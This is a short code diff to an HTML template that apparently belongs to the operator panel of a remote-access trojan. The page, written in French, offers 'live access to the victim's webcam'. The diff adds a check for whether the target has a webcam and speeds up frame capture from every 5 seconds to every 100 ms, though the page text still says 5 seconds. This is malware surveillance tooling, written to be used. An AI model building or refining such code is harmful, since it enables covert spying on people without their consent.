@@ -1,6 +1,7 @@
 {% extends "server/session.html" %}
 {% block session_content %}
 
+  {% if has_webcam %}
 
 	{% if not enabled %}
 	<p>Accédez en direct à la webcam de la victime. La fréquence de rafraîchissement de l'image est fixée à 5 secondes.</p>
@@ -63,10 +64,17 @@
 		req.send(null);
 	}
 
-	setInterval(function() { updateFrame(); }, 5000);
+	setInterval(function() { updateFrame(); }, 100);
 	updateFrame();
 	</script>
 	{% endif %}
+
+	{% endif %}
+
+	{% if not has_webcam %}
+	<p class="text-center"><font color="red">Target doesn't have webcam.</font></p>
+	{% endif %}
+
 
 
 
